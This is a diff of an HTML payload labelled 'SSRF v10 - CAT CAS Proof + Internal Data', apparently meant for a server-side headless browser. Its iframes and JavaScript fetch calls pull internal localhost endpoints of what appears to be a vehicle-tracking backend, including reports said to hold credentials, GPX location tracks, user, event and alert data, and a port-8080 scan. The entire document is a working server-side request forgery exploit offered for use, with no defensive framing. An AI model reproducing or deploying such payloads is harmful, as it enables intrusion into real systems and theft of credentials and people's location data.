@@ -10,71 +10,55 @@ pre{white-space:pre-wrap;font-size:5.5px;background:#f5f5f5;padding:1px;word-bre
 </style>
 </head>
 <body>
-<b>SSRF v9 - Generate + GPX from localhost</b>
+<b>SSRF v10 - CAT CAS Proof + Internal Data</b>
 
-<!-- cmd=generate from localhost - full HTML with global_conf credentials -->
-<div class="s"><h3>cmd=generate FROM LOCALHOST (full HTML with creds)</h3>
-<iframe style="height:500px" src="https://127.0.0.1/backend/mobile_report.php?cmd=generate&lang=en&veh_id=1&report_type=1&start_date=2025-01-01&stop_date=2025-01-02"></iframe></div>
+<!-- UA -->
+<div class="s"><h3>Chromium Version</h3>
+<pre id="ua">...</pre></div>
 
-<!-- GPX file from localhost -->
-<div class="s"><h3>GPX track_id=1 FROM LOCALHOST</h3>
-<iframe style="height:200px" src="https://127.0.0.1/ax/get_gpx_file.php?track_id=1&node=3"></iframe></div>
-
-<div class="s"><h3>GPX track_id=1 /backend/ path</h3>
-<iframe style="height:100px" src="https://127.0.0.1/backend/ax/get_gpx_file.php?track_id=1&node=3"></iframe></div>
-
-<!-- reports.php from localhost (used internally by cmd=generate) -->
-<div class="s"><h3>/ax/reports.php?node=3 FROM LOCALHOST</h3>
-<iframe style="height:200px" src="https://127.0.0.1/ax/reports.php?node=3"></iframe></div>
-
-<!-- Login page full details -->
-<div class="s"><h3>/ (root) FROM LOCALHOST</h3>
-<iframe style="height:300px" src="https://127.0.0.1/"></iframe></div>
-
-<!-- init.php with query params -->
-<div class="s"><h3>/backend/ax/init.php?node=3</h3>
+<!-- init.php from localhost - shows CAT CAS branding -->
+<div class="s"><h3>INIT.PHP FROM LOCALHOST (CAT CAS config)</h3>
 <iframe style="height:150px" src="https://127.0.0.1/backend/ax/init.php?node=3"></iframe></div>
 
-<!-- Try logo.php which might reveal tenant info -->
-<div class="s"><h3>/backend/logo.php</h3>
-<iframe style="height:80px" src="https://127.0.0.1/backend/logo.php"></iframe></div>
+<!-- cmd=generate from localhost -->
+<div class="s"><h3>CMD=GENERATE FROM LOCALHOST</h3>
+<iframe style="height:400px" src="https://127.0.0.1/backend/mobile_report.php?cmd=generate&lang=en&veh_id=1&report_type=1&start_date=2025-01-01&stop_date=2025-01-02"></iframe></div>
 
-<!-- favicon shows branding -->
-<div class="s"><h3>/backend/favicon.php</h3>
-<iframe style="height:60px" src="https://127.0.0.1/backend/favicon.php"></iframe></div>
+<!-- GPX from localhost -->
+<div class="s"><h3>GPX TRACK 50 FROM LOCALHOST</h3>
+<iframe style="height:100px" src="https://127.0.0.1/ax/get_gpx_file.php?track_id=50&node=3"></iframe></div>
 
-<!-- Port 8080 deep scan results -->
-<div class="s"><h3>FETCH RESULTS</h3>
+<!-- Login page (shows CAT CAS logo) -->
+<div class="s"><h3>LOGIN PAGE FROM LOCALHOST (CAT branding)</h3>
+<iframe style="height:250px" src="https://127.0.0.1/"></iframe></div>
+
+<!-- JS FETCH RESULTS -->
+<div class="s"><h3>FETCH RESULTS (internal endpoints)</h3>
 <pre id="r">scanning...</pre></div>
 
 <script>
+document.getElementById('ua').textContent = navigator.userAgent;
+
 var o='';
 function p(s){o+=s+'\n';document.getElementById('r').textContent=o}
 
 async function tf(l,u){
-try{var r=await fetch(u);var t=await r.text();p(l+' ['+r.status+']: '+t.substring(0,300))}
+try{var r=await fetch(u);var t=await r.text();p(l+' ['+r.status+']: '+t.substring(0,500))}
 catch(e){p(l+' ERR: '+e.message)}
 }
 
 (async function(){
-// Port 8080 with various content types
+// Access init.php via HTTP fetch (mixed content might work like port 8080)
+await tf('HTTP-init','http://127.0.0.1/backend/ax/init.php?node=3');
+await tf('HTTP-tree','http://127.0.0.1/ax/tree.php?node=3');
+await tf('HTTP-vehlist','http://127.0.0.1/ax/veh/list.php?node=3');
+await tf('HTTP-user','http://127.0.0.1/backend/ax/user.php?node=3');
+await tf('HTTP-events','http://127.0.0.1/backend/ax/events.php?node=3');
+await tf('HTTP-alerts','http://127.0.0.1/backend/ax/alerts.php?node=3');
+await tf('HTTP-tracks','http://127.0.0.1/ax/tracks_get.php?node=3');
+await tf('HTTP-gpx','http://127.0.0.1/ax/get_gpx_file.php?track_id=50&node=3');
+// Port 8080
 await tf('8080:/','http://127.0.0.1:8080/');
-await tf('8080:idx','http://127.0.0.1:8080/index.html');
-await tf('8080:idx2','http://127.0.0.1:8080/index.php');
-await tf('8080:app','http://127.0.0.1:8080/app');
-await tf('8080:ws','http://127.0.0.1:8080/ws');
-await tf('8080:websocket','http://127.0.0.1:8080/websocket');
-await tf('8080:socket.io','http://127.0.0.1:8080/socket.io/');
-await tf('8080:wss','http://127.0.0.1:8080/wss');
-await tf('8080:gps','http://127.0.0.1:8080/gps');
-await tf('8080:track','http://127.0.0.1:8080/track');
-await tf('8080:data','http://127.0.0.1:8080/data');
-await tf('8080:api/gps','http://127.0.0.1:8080/api/gps');
-await tf('8080:api/track','http://127.0.0.1:8080/api/track');
-await tf('8080:api/data','http://127.0.0.1:8080/api/data');
-await tf('8080:pilot','http://127.0.0.1:8080/pilot');
-await tf('8080:backend','http://127.0.0.1:8080/backend');
-
 p('DONE');
 })();
 </script>
